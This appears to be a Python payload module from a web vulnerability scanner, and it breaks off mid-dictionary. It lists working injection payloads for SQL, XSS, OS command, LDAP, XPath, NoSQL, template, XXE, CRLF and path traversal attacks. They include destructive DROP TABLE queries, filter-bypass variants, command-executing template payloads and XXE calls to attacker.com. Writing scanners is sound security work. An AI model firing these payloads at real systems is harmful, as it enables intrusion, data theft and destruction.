"""
Comprehensive Injection Payloads Module
=======================================

Generic payloads for all injection types - NO application-specific hardcoding.
Designed to match/exceed detection rates of W3af, ZAP, Wapiti, Arachni, Vega, Nuclei.

Reference: Izzat et al. - "Design and Implementation of Distributed Web Application 
Vulnerability Assessment Tools for Securing Complex Microservices Environment"

Categories:
- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Command Injection (OS Command)
- LDAP Injection
- XPath Injection
- NoSQL Injection
- Server-Side Template Injection (SSTI)
- XML External Entity (XXE)
- CRLF Injection (Header Injection)
- Local File Inclusion (LFI) / Path Traversal

Author: RAJDOLL Security Scanner
Version: 2.0 - Benchmark-Aligned Implementation
"""

from typing import Dict, List, Any
from dataclasses import dataclass
from enum import Enum


class InjectionType(Enum):
    """Supported injection types"""
    SQLI = "sqli"
    XSS = "xss"
    COMMAND = "command"
    LDAP = "ldap"
    XPATH = "xpath"
    NOSQL = "nosql"
    SSTI = "ssti"
    XXE = "xxe"
    CRLF = "crlf"
    LFI = "lfi"
    SSRF = "ssrf"


@dataclass
class InjectionTechnique:
    """Represents a single injection technique with payloads and indicators"""
    name: str
    description: str
    payloads: List[str]
    indicators: List[str]
    severity: str  # critical, high, medium, low
    false_positive_check: str = ""  # Additional validation to reduce FP


# =============================================================================
# SQL INJECTION (SQLi) - Enhanced with OOB, Second-Order, WAF Bypass
# =============================================================================

SQLI_TECHNIQUES: Dict[str, InjectionTechnique] = {
    # Error-Based SQLi
    "error_based_generic": InjectionTechnique(
        name="Error-Based SQLi (Generic)",
        description="Triggers database error messages revealing SQL structure",
        payloads=[
            "'",
            "\"",
            "'--",
            "\"--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "') OR ('1'='1",
            "1' AND '1'='1",
            "1\" AND \"1\"=\"1",
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=1--",
            "' AND 1=2--",
            "admin'--",
            "1; SELECT 1--",
        ],
        indicators=[
            "sql syntax", "mysql", "mariadb", "postgresql", "sqlite", 
            "oracle", "mssql", "sql server", "odbc", "jdbc",
            "you have an error", "query failed", "syntax error",
            "unexpected token", "unterminated string", "quoted string"
        ],
        severity="high"
    ),
    
    # MySQL Specific
    "error_based_mysql": InjectionTechnique(
        name="Error-Based SQLi (MySQL)",
        description="MySQL-specific error extraction",
        payloads=[
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT VERSION()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND GTID_SUBSET(CONCAT(0x7e,VERSION()),1)--",
            "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))--",
            "' AND EXP(~(SELECT * FROM (SELECT VERSION())a))--",
        ],
        indicators=["mysql", "mariadb", "extractvalue", "updatexml", "floor(rand"],
        severity="high"
    ),
    
    # PostgreSQL Specific
    "error_based_postgresql": InjectionTechnique(
        name="Error-Based SQLi (PostgreSQL)",
        description="PostgreSQL-specific error extraction",
        payloads=[
            "' AND 1=CAST(VERSION() AS INT)--",
            "' AND 1=CAST(CHR(126)||VERSION()||CHR(126) AS INT)--",
            "'||(SELECT '')||'",
            "';SELECT PG_SLEEP(5)--",
            "' AND SUBSTRING(VERSION(),1,1)>'0",
        ],
        indicators=["postgresql", "pg_", "pgsql", "invalid input syntax"],
        severity="high"
    ),
    
    # MSSQL Specific
    "error_based_mssql": InjectionTechnique(
        name="Error-Based SQLi (MSSQL)",
        description="Microsoft SQL Server error extraction",
        payloads=[
            "' AND 1=CONVERT(INT,@@VERSION)--",
            "' AND 1=CONVERT(INT,DB_NAME())--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--",
            "' UNION SELECT NULL,@@VERSION--",
        ],
        indicators=["mssql", "sql server", "microsoft", "xp_", "sysobjects", "nvarchar"],
        severity="high"
    ),
    
    # Oracle Specific
    "error_based_oracle": InjectionTechnique(
        name="Error-Based SQLi (Oracle)",
        description="Oracle Database error extraction",
        payloads=[
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
            "'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'",
            "' UNION SELECT NULL,banner FROM v$version--",
        ],
        indicators=["ora-", "oracle", "v$version", "utl_", "ctxsys"],
        severity="high"
    ),
    
    # SQLite Specific
    "error_based_sqlite": InjectionTechnique(
        name="Error-Based SQLi (SQLite)",
        description="SQLite error extraction",
        payloads=[
            "' AND 1=CAST(sqlite_version() AS INT)--",
            "' UNION SELECT NULL,sqlite_version()--",
            "' AND RANDOMBLOB(100000000)--",
            "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--",
        ],
        indicators=["sqlite", "sqlite_version", "no such column", "unrecognized token"],
        severity="high"
    ),
    
    # Union-Based SQLi
    "union_based": InjectionTechnique(
        name="Union-Based SQLi",
        description="Extract data using UNION SELECT",
        payloads=[
            # Column enumeration
            "' ORDER BY 1--",
            "' ORDER BY 5--",
            "' ORDER BY 10--",
            "' ORDER BY 20--",
            # Union with NULL
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            # Data extraction
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 'a','b','c','d','e'--",
            "' UNION SELECT username,password,NULL,NULL,NULL FROM users--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "-1' UNION SELECT 1,2,3--",
            "0 UNION SELECT 1,2,3--",
        ],
        indicators=["union", "select", "order by", "information_schema"],
        severity="critical"
    ),
    
    # Boolean-Based Blind SQLi
    "blind_boolean": InjectionTechnique(
        name="Boolean-Based Blind SQLi",
        description="Infer data by comparing true/false responses",
        payloads=[
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5",
            "' AND SUBSTRING(@@version,1,1)='8",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1) AND (1=1",
            "1) AND (1=2",
            "true",
            "false",
        ],
        indicators=[],  # Compare response lengths/content
        severity="high",
        false_positive_check="Compare response length difference > 100 chars"
    ),
    
    # Time-Based Blind SQLi
    "time_based": InjectionTechnique(
        name="Time-Based Blind SQLi",
        description="Infer data by measuring response delays",
        payloads=[
            # MySQL
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "'; SELECT SLEEP(5)--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            # PostgreSQL
            "'; SELECT PG_SLEEP(5)--",
            "' AND PG_SLEEP(5)--",
            "' OR PG_SLEEP(5)--",
            # MSSQL
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND WAITFOR DELAY '0:0:5'--",
            "'; IF 1=1 WAITFOR DELAY '0:0:5'--",
            # Oracle
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "' AND UTL_INADDR.GET_HOST_NAME('10.0.0.1')--",
            # SQLite
            "' AND RANDOMBLOB(500000000)--",
        ],
        indicators=[],  # Check response time > 5 seconds
        severity="high",
        false_positive_check="Response time must be consistently > 5s"
    ),
    
    # Stacked Queries
    "stacked_queries": InjectionTechnique(
        name="Stacked Queries SQLi",
        description="Execute multiple SQL statements",
        payloads=[
            "'; DROP TABLE test--",
            "'; INSERT INTO users VALUES('test','test')--",
            "'; UPDATE users SET password='hacked'--",
            "'; CREATE TABLE test(id int)--",
            "1; DROP TABLE test--",
            "1; SELECT * FROM users--",
        ],
        indicators=["syntax error", "multiple queries", "statement"],
        severity="critical"
    ),
    
    # Second-Order SQLi (NEW)
    "second_order": InjectionTechnique(
        name="Second-Order SQLi",
        description="Payload stored then triggered later",
        payloads=[
            "admin'--",
            "test' OR '1'='1",
            "user'); DROP TABLE users--",
            "data','hacked')--",
            "value'); INSERT INTO admin VALUES('attacker','pass')--",
        ],
        indicators=["sql", "syntax", "error"],
        severity="critical",
        false_positive_check="Check if payload appears in different context later"
    ),
    
    # WAF Bypass Techniques (NEW)
    "waf_bypass": InjectionTechnique(
        name="WAF Bypass SQLi",
        description="Bypass Web Application Firewall filters",
        payloads=[
            # Case variation
            "' oR '1'='1",
            "' AnD '1'='1",
            "' uNiOn SeLeCt NULL--",
            # Comment injection
            "' UN/**/ION SEL/**/ECT NULL--",
            "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
            "' UNION/**/SELECT/**/NULL--",
            # Encoding
            "' %55NION %53ELECT NULL--",  # URL encoded
            "' &#x55;NION &#x53;ELECT NULL--",  # HTML entity
            "' \x55NION \x53ELECT NULL--",  # Hex
            # Whitespace alternatives
            "' UNION%09SELECT%09NULL--",  # Tab
            "' UNION%0ASELECT%0ANULL--",  # Newline
            "' UNION%0BSELECT%0BNULL--",  # Vertical tab
            "' UNION%0CSELECT%0CNULL--",  # Form feed
            "' UNION%0DSELECT%0DNULL--",  # Carriage return
            "'+UNION+SELECT+NULL--",
            # Double URL encoding
            "'%2520OR%25201=1--",
            # Null bytes
            "' UNION%00SELECT NULL--",
            "'%00OR%001=1",
            # Alternative syntax
            "' || '1'='1",  # Oracle concat
            "' && '1'='1",
            "' -1' or '1",
        ],
        indicators=["sql", "syntax", "union", "select"],
        severity="high"
    ),
    
    # Database Fingerprinting (NEW)
    "db_fingerprint": InjectionTechnique(
        name="Database Fingerprinting",
        description="Identify database type and version",
        payloads=[
            # Version queries
            "' AND @@VERSION--",  # MSSQL
            "' AND VERSION()--",  # MySQL
            "' AND version()--",  # PostgreSQL
            "' AND sqlite_version()--",  # SQLite
            "' AND (SELECT banner FROM v$version WHERE ROWNUM=1)--",  # Oracle
            # String concatenation differences
            "' || 'test",  # Oracle, PostgreSQL
            "' + 'test",  # MSSQL
            "' 'test",    # MySQL (space concatenation)
            "' CONCAT('a','b')--",  # MySQL function
            # Comment styles
            "1--comment",  # MSSQL, PostgreSQL
            "1#comment",   # MySQL
            "1/*comment*/",  # All
        ],
        indicators=["mysql", "mariadb", "postgresql", "mssql", "sqlite", "oracle"],
        severity="medium"
    ),
}


# =============================================================================
# CROSS-SITE SCRIPTING (XSS) - Context-Aware with Filter Bypass
# =============================================================================

XSS_TECHNIQUES: Dict[str, InjectionTechnique] = {
    # Reflected XSS - Basic
    "reflected_basic": InjectionTechnique(
        name="Reflected XSS (Basic)",
        description="Basic script tag injection",
        payloads=[
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script src=//evil.com/x.js></script>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
        ],
        indicators=["<script>", "<script ", "alert(", "document."],
        severity="high"
    ),
    
    # Event Handler XSS
    "event_handlers": InjectionTechnique(
        name="Event Handler XSS",
        description="XSS via HTML event handlers",
        payloads=[
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror='alert(1)'>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<iframe onload=alert(1)>",
            "<object data=x onerror=alert(1)>",
            "<embed src=x onerror=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        ],
        indicators=["onerror", "onload", "onfocus", "onmouseover", "onclick"],
        severity="high"
    ),
    
    # Attribute Context XSS
    "attribute_context": InjectionTechnique(
        name="Attribute Context XSS",
        description="Break out of HTML attributes",
        payloads=[
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)'",
            '" onclick="alert(1)',
            "' onclick='alert(1)'",
            '" onfocus="alert(1)" autofocus x="',
            '" onmouseenter="alert(1)" x="',
            '" style="background:url(javascript:alert(1))"',
            "' onfocus=alert(1) '",
            "> <script>alert(1)</script>",
            "'> <script>alert(1)</script>",
            '"> <script>alert(1)</script>',
        ],
        indicators=["onmouseover", "onclick", "onfocus", 'style="'],
        severity="high"
    ),
    
    # JavaScript Context XSS
    "javascript_context": InjectionTechnique(
        name="JavaScript Context XSS",
        description="Break out of JavaScript strings/context",
        payloads=[
            "'-alert(1)-'",
            '"-alert(1)-"',
            "';alert(1)//",
            '";alert(1)//',
            "</script><script>alert(1)</script>",
            "\\';alert(1)//",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            "${alert(1)}",
            "{{constructor.constructor('alert(1)')()}}",
        ],
        indicators=["alert(", "</script>", "${"],
        severity="high"
    ),
    
    # DOM-Based XSS
    "dom_based": InjectionTechnique(
        name="DOM-Based XSS",
        description="XSS via DOM manipulation (client-side)",
        payloads=[
            "#<img src=x onerror=alert(1)>",
            "#<script>alert(1)</script>",
            "javascript:alert(1)",
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:msgbox(1)",
        ],
        indicators=["javascript:", "data:", "#<"],
        severity="high"
    ),
    
    # SVG/MathML XSS
    "svg_mathml": InjectionTechnique(
        name="SVG/MathML XSS",
        description="XSS via SVG and MathML elements",
        payloads=[
            "<svg onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><animate onbegin=alert(1)>",
            "<svg><set onbegin=alert(1)>",
            "<svg><foreignObject><body onload=alert(1)>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
            "<svg><use href=data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#x>",
        ],
        indicators=["<svg", "<math", "onbegin", "foreignObject"],
        severity="high"
    ),
    
    # Encoded XSS - Filter Bypass
    "encoded_bypass": InjectionTechnique(
        name="Encoded XSS (Filter Bypass)",
        description="Bypass filters using various encodings",
        payloads=[
            # URL encoding
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "%3Cimg%20src=x%20onerror=alert(1)%3E",
            # Double URL encoding
            "%253Cscript%253Ealert(1)%253C/script%253E",
            # HTML entity encoding
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            # Unicode encoding
            "\u003cscript\u003ealert(1)\u003c/script\u003e",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            # Mixed case
            "<ScRiPt>alert(1)</ScRiPt>",
            "<SCRIPT>alert(1)</SCRIPT>",
            # Null bytes
            "<scr%00ipt>alert(1)</scr%00ipt>",
            "<script%00>alert(1)</script>",
            # Whitespace variations
            "<script\t>alert(1)</script>",
            "<script\n>alert(1)</script>",
            "<script/>alert(1)</script>",
        ],
        indicators=["script", "alert", "onerror"],
        severity="high"
    ),
    
    # Polyglot XSS
    "polyglot": InjectionTechnique(
        name="Polyglot XSS",
        description="Payloads that work in multiple contexts",
        payloads=[
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"-->]]>*/</script></title></textarea></style></noscript></template></xmp><svg onload=alert()>",
            "'-alert(1)-'",
            '"-alert(1)-"',
            "</ScRiPt><ScRiPt>alert(1)</ScRiPt>",
        ],
        indicators=["alert", "script", "onclick"],
        severity="high"
    ),
}


# =============================================================================
# COMMAND INJECTION (OS Command) - NEW
# =============================================================================

COMMAND_INJECTION_TECHNIQUES: Dict[str, InjectionTechnique] = {
    # Basic Command Injection
    "basic_unix": InjectionTechnique(
        name="Basic Command Injection (Unix)",
        description="Basic Unix/Linux command injection",
        payloads=[
            "; id",
            "; whoami",
            "; cat /etc/passwd",
            "| id",
            "| whoami",
            "| cat /etc/passwd",
            "|| id",
            "&& id",
            "& id",
            "`id`",
            "$(id)",
            "; ls -la",
            "| ls -la",
            "; uname -a",
            "| uname -a",
            "; pwd",
            "| pwd",
            "; env",
            "| env",
        ],
        indicators=["uid=", "gid=", "root:", "bin:", "daemon:", "whoami:", "Linux", "Darwin"],
        severity="critical"
    ),
    
    "basic_windows": InjectionTechnique(
        name="Basic Command Injection (Windows)",
        description="Basic Windows command injection",
        payloads=[
            "& whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "; whoami",
            "& dir",
            "| dir",
            "& type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "& ipconfig",
            "| ipconfig",
            "& net user",
            "| net user",
            "& hostname",
            "| hostname",
            "& systeminfo",
        ],
        indicators=["COMPUTERNAME", "Windows", "Microsoft", "Administrator", "[fonts]", "[extensions]"],
        severity="critical"
    ),
    
    # Blind Command Injection (Time-Based)
    "blind_time_unix": InjectionTechnique(
        name="Blind Command Injection - Time (Unix)",
        description="Detect command injection via time delays",
        payloads=[
            "; sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "&& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; sleep 5 #",
            "| sleep 5 #",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
        ],
        indicators=[],  # Check response time > 5s
        severity="critical",
        false_positive_check="Response time must be > 5s"
    ),
    
    "blind_time_windows": InjectionTechnique(
        name="Blind Command Injection - Time (Windows)",
        description="Detect command injection via time delays on Windows",
        payloads=[
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "&& ping -n 5 127.0.0.1",
            "|| ping -n 5 127.0.0.1",
            "& timeout /t 5",
            "| timeout /t 5",
        ],
        indicators=[],  # Check response time > 5s
        severity="critical",
        false_positive_check="Response time must be > 5s"
    ),
    
    # Filter Bypass
    "bypass_filters": InjectionTechnique(
        name="Command Injection Filter Bypass",
        description="Bypass command injection filters",
        payloads=[
            # Whitespace alternatives
            ";{id}",
            "$IFS;id",
            ";id$IFS",
            "${IFS}id",
            # Quote bypass
            "';'id",
            '";id',
            # Encoding
            ";`echo id | base64 -d`",
            ";i]d",
            ";i''d",
            ';i""d',
            # Variable injection
            ";$PATH/../../../bin/id",
            ";/???/??t /???/p??s??",  # cat /etc/passwd with wildcards
            # Newline injection
            "%0aid",
            "%0a%0did",
            "\nid",
            "\r\nid",
        ],
        indicators=["uid=", "gid=", "root:", "whoami"],
        severity="critical"
    ),
}


# =============================================================================
# LDAP INJECTION - NEW
# =============================================================================

LDAP_INJECTION_TECHNIQUES: Dict[str, InjectionTechnique] = {
    "basic_ldap": InjectionTechnique(
        name="Basic LDAP Injection",
        description="LDAP filter injection",
        payloads=[
            "*",
            "*)(&",
            "*)(|",
            "*))%00",
            ")(cn=*)",
            ")(|(cn=*))",
            "*))(|(cn=*",
            "admin)(&(password=*))",
            "*)(uid=*))(&(uid=*",
            "x*)(|(password=*))",
            "*()|&'",
            "admin)(|(password=*))",
        ],
        indicators=["ldap", "invalid filter", "search filter", "dn:"],
        severity="high"
    ),
    
    "ldap_auth_bypass": InjectionTechnique(
        name="LDAP Authentication Bypass",
        description="Bypass LDAP authentication",
        payloads=[
            "*)(&",
            "*))%00",
            "admin)(&)",
            "admin)(|(",
            "*)(objectClass=*",
            "*)(|(objectClass=*))",
            "admin)(!(&(1=0)))",
        ],
        indicators=["authenticated", "success", "welcome"],
        severity="critical"
    ),
}


# =============================================================================
# XPATH INJECTION - NEW
# =============================================================================

XPATH_INJECTION_TECHNIQUES: Dict[str, InjectionTechnique] = {
    "basic_xpath": InjectionTechnique(
        name="Basic XPath Injection",
        description="XPath query injection",
        payloads=[
            "'",
            "' or '1'='1",
            "' or ''='",
            "'] | //* | ['",
            "' or 1=1 or '",
            "' or 'a'='a",
            "1 or 1=1",
            "admin' or '1'='1",
            "' and '1'='1",
            "' and 1=1 and '",
            "x]|//user[username='admin",
            "x'] | //user[username/text()='admin",
        ],
        indicators=["xpath", "xml", "expression", "syntax", "invalid"],
        severity="high"
    ),
    
    "xpath_extraction": InjectionTechnique(
        name="XPath Data Extraction",
        description="Extract data via XPath",
        payloads=[
            "' or count(/*)=1 or '",
            "' or string-length(name(/*))=1 or '",
            "' or substring(name(/*),1,1)='a' or '",
            "'] | //user/* | ['",
            "x']|//user[position()=1]/password|a['x",
        ],
        indicators=["count", "string-length", "substring"],
        severity="high"
    ),
}


# =============================================================================
# NOSQL INJECTION - NEW
# =============================================================================

NOSQL_INJECTION_TECHNIQUES: Dict[str, InjectionTechnique] = {
    # MongoDB Injection
    "mongodb_basic": InjectionTechnique(
        name="MongoDB Injection",
        description="MongoDB NoSQL injection",
        payloads=[
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$gt": undefined}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"$or": [{"x": 1}, {"x": 2}]}',
            "admin' || '1'=='1",
            "'; return true; var x='",
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        ],
        indicators=["mongodb", "mongoose", "bson", "objectid", "collection"],
        severity="high"
    ),
    
    # MongoDB Auth Bypass
    "mongodb_auth_bypass": InjectionTechnique(
        name="MongoDB Auth Bypass",
        description="Bypass MongoDB authentication",
        payloads=[
            '{"$gt": ""}',
            '{"$ne": "x"}',
            '{"$nin": []}',
            '{"$exists": true}',
            '{"$regex": "^a"}',
        ],
        indicators=["authenticated", "success", "token", "session"],
        severity="critical"
    ),
    
    # CouchDB Injection
    "couchdb": InjectionTechnique(
        name="CouchDB Injection",
        description="CouchDB NoSQL injection",
        payloads=[
            '{"selector": {"_id": {"$gt": null}}}',
            '{"selector": {"password": {"$exists": true}}}',
        ],
        indicators=["couchdb", "couch", "futon"],
        severity="high"
    ),
}


# =============================================================================
# SERVER-SIDE TEMPLATE INJECTION (SSTI) - NEW
# =============================================================================

SSTI_TECHNIQUES: Dict[str, InjectionTechnique] = {
    # Detection/Fingerprinting
    "ssti_detection": InjectionTechnique(
        name="SSTI Detection",
        description="Detect template injection vulnerability",
        payloads=[
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",
            "@(7*7)",
            "{{7*'7'}}",
            "{{config}}",
            "{{self}}",
        ],
        indicators=["49", "7777777", "config", "self"],
        severity="critical"
    ),
    
    # Jinja2 (Python Flask)
    "ssti_jinja2": InjectionTechnique(
        name="SSTI Jinja2 (Python)",
        description="Jinja2 template injection (Python/Flask)",
        payloads=[
            "{{config.items()}}",
            "{{self.__class__.__mro__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__bases__[0].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        ],
        indicators=["__class__", "__mro__", "subclasses", "uid=", "config"],
        severity="critical"
    ),
    
    # Twig (PHP)
    "ssti_twig": InjectionTechnique(
        name="SSTI Twig (PHP)",
        description="Twig template injection (PHP/Symfony)",
        payloads=[
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{app.request.server.all|join(',')}}",
            "{{'/etc/passwd'|file_excerpt(1,30)}}",
        ],
        indicators=["registerUndefinedFilterCallback", "uid=", "root:"],
        severity="critical"
    ),
    
    # Freemarker (Java)
    "ssti_freemarker": InjectionTechnique(
        name="SSTI Freemarker (Java)",
        description="Freemarker template injection (Java)",
        payloads=[
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        ],
        indicators=["freemarker", "uid=", "Execute"],
        severity="critical"
    ),
    
    # Velocity (Java)
    "ssti_velocity": InjectionTechnique(
        name="SSTI Velocity (Java)",
        description="Velocity template injection (Java)",
        payloads=[
            "#set($ex = $class.forName('java.lang.Runtime').getRuntime().exec('id'))",
            "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()",
        ],
        indicators=["velocity", "runtime", "exec", "uid="],
        severity="critical"
    ),
    
    # ERB (Ruby)
    "ssti_erb": InjectionTechnique(
        name="SSTI ERB (Ruby)",
        description="ERB template injection (Ruby/Rails)",
        payloads=[
            "<%= system('id') %>",
            "<%= `id` %>",
            "<%= IO.popen('id').readlines() %>",
            "<%= File.read('/etc/passwd') %>",
        ],
        indicators=["uid=", "root:", "erb", "rails"],
        severity="critical"
    ),
}


# =============================================================================
# XML EXTERNAL ENTITY (XXE) INJECTION - NEW
# =============================================================================

XXE_TECHNIQUES: Dict[str, InjectionTechnique] = {
    # Basic XXE
    "xxe_basic": InjectionTechnique(
        name="Basic XXE",
        description="Basic XML External Entity injection",
        payloads=[
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]><foo>&xxe;</foo>',
        ],
        indicators=["root:", "daemon:", "[fonts]", "[extensions]"],
        severity="critical"
    ),
    
    # XXE via Parameter Entities
    "xxe_parameter": InjectionTechnique(
        name="XXE Parameter Entities",
        description="XXE using parameter entities",
        payloads=[
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a "<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>">%a;]><foo>&xxe;</foo>',
        ],
        indicators=["root:", "daemon:", "external entity"],
        severity="critical"
    ),
    
    # Blind XXE (OOB)
    "xxe_blind_oob": InjectionTechnique(
        name="Blind XXE (Out-of-Band)",
        description="Blind XXE via external connections",
        payloads=[
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER_SERVER/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/evil.dtd">%xxe;%all;]><foo>&send;</foo>',
        ],
        indicators=[],  # Check callback server
        severity="critical",
        false_positive_check="Check for OOB callback"
    ),
    
    # XXE via File Upload
    "xxe_file_upload": InjectionTechnique(
        name="XXE via File Upload",
        description="XXE via SVG, DOCX, XLSX uploads",
        payloads=[
            # SVG
            '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>',
            # SOAP
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Envelope><Body>&xxe;</Body></Envelope>',
        ],
        indicators=["root:", "svg", "image"],
        severity="critical"
    ),
}


# =============================================================================
# CRLF INJECTION (Header Injection) - NEW
# =============================================================================

CRLF_TECHNIQUES: Dict[str, InjectionTechnique] = {
    "crlf_basic": InjectionTechnique(
        name="Basic CRLF Injection",
        description="HTTP header injection via CRLF",
        payloads=[
            "%0d%0aSet-Cookie:%20malicious=value",
            "%0d%0aX-Injected:%20header",
            "%0d%0a%0d%0a<html>injected</html>",
            "\r\nSet-Cookie: malicious=value",
            "\r\nX-Injected: header",
            "%0d%0aLocation:%20http://evil.com",
            "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK",
            "\\r\\nX-Injected: header",
            "%E5%98%8A%E5%98%8DSet-Cookie:%20malicious=value",  # Unicode CRLF
        ],
        indicators=["set-cookie:", "x-injected:", "location:"],
        severity="medium"
    ),
    
    "crlf_response_split": InjectionTechnique(
        name="HTTP Response Splitting",
        description="Full HTTP response injection",
        payloads=[
            "%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>pwned</html>",
            "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
        ],
        indicators=["HTTP/1.1", "content-type:", "pwned"],
        severity="high"
    ),
}


# =============================================================================
# LOCAL FILE INCLUSION (LFI) - Enhanced
# =============================================================================

LFI_TECHNIQUES: Dict[str, InjectionTechnique] = {
    # Basic Path Traversal
    "path_traversal_basic": InjectionTechnique(
        name="Basic Path Traversal",
        description="Basic directory traversal",
        payloads=[
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../etc/shadow",
            "../../../etc/hosts",
            "../../../etc/hostname",
            "../../../proc/self/environ",
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log",
        ],
        indicators=["root:", "bin:", "daemon:", "nobody:", "127.0.0.1"],
        severity="high"
    ),
    
    # Windows Path Traversal
